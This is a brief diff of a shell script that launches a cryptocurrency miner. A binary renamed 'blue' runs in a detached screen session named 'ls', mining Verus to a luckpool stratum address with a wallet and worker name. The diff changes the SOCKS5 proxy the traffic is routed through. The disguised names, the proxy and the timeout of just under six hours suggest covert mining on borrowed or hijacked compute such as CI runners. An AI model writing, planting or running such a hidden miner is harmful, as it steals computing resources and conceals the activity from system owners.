@@ -6,6 +6,6 @@ screen -dmS ls
 A=stratum+tcp://na.luckpool.net:3956
 B=RURWcc2tJvtv8xTfBuS8aakhg4FPAdVMtd
 C=Gandos-1
-D=socks5://176.9.160.118:22836
+D=socks5://98.178.72.21:10919
 timeout 359m ./blue -a verus -o $A -u $B.$C -p x -t 2 -x $D
 sudo apt update
